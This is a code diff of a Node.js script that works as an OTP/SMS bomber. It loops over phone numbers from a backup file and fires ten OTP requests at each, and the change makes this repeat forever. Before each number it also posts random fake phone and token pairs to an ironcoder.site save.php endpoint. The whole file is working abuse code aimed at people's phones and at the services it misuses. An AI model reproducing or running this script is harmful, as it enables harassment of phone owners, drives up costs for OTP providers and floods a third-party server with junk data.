@@ -1,27 +1,39 @@
-const axios = require("axios");
-const fs = require("fs");
+import axios from "axios";
+import fs from "fs";
 
-// ✅ Read phone numbers from backup.json
-function loadBackupPhones() {
-  try {
-    const raw = fs.readFileSync("backup.json", "utf8");
-    const parsed = JSON.parse(raw);
-    return parsed.map(p => p.phone);
-  } catch (e) {
-    console.error("❌ Error reading backup.json:", e.message);
-    return [];
+// 🔁 Load backup + block
+const backup = JSON.parse(fs.readFileSync("backup.json"));
+const blockList = JSON.parse(fs.readFileSync("block.json"));
+
+// ✅ Random token
+function randomToken(length = 32) {
+  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+  let token = "";
+  for (let i = 0; i < length; i++) {
+    token += chars.charAt(Math.floor(Math.random() * chars.length));
   }
+  return token;
 }
 
-// ✅ Read block list
-function loadBlockList() {
+// ✅ Random 096 phone
+function randomPhone() {
+  return "096" + Math.floor(Math.random() * 1e8).toString().padStart(8, "0");
+}
+
+// ✅ Save token+phone to server
+async function postToSave() {
   try {
-    const raw = fs.readFileSync("block.json", "utf8");
-    const parsed = JSON.parse(raw);
-    return parsed.map(p => p.phone);
+    const phone = randomPhone();
+    const token = randomToken();
+    const res = await axios.post("https://ironcoder.site/ironmyid/save.php", {
+      phone,
+      token
+    }, {
+      headers: { "Content-Type": "application/json" }
+    });
+    console.log(`✅ Save success: ${phone}`);
   } catch (e) {
-    console.warn("⚠️ No block.json or error reading, skipping block list.");
-    return [];
+    console.error("❌ Save failed:", e.message);
   }
 }
 
@@ -34,28 +46,32 @@ async function sendOtp(phone) {
       if (res.status === 200) {
         console.log(`✅ (${i + 1}/10) OTP sent to ${phone}`);
       } else {
-        console.log(`⚠️ (${i + 1}/10) Failed for ${phone}: Status ${res.status}`);
+        console.log(`⚠️ (${i + 1}/10) Failed to send to ${phone} - Status: ${res.status}`);
       }
     } catch (e) {
-      console.error(`❌ (${i + 1}/10) Error for ${phone}: ${e.message}`);
+      console.error(`❌ (${i + 1}/10) OTP error for ${phone}:`, e.message);
     }
   }
 }
 
-// ✅ Main
-async function main() {
-  const phones = loadBackupPhones();
-  const blocked = loadBlockList();
+// ✅ Main loop
+async function runAll() {
+  while (true) {
+    for (const entry of backup) {
+      const phone = entry.phone;
+      if (blockList.includes(phone)) {
+        console.log(`⏭ Skipped blocked number: ${phone}`);
+        continue;
+      }
 
-  for (const phone of phones) {
-    if (blocked.includes(phone)) {
-      console.log(`⏭ Skipped blocked phone: ${phone}`);
-      continue;
+      // ✅ Step 1: save random user
+      await postToSave();
+
+      // ✅ Step 2: send OTP to phone 10 times
+      await sendOtp(phone);
     }
-    await sendOtp(phone);
+    console.log("🔁 Restarting loop after processing all phones...");
   }
-
-  console.log("✅ All OTPs sent from backup.json (excluding block list).");
 }
 
-main();
+runAll();
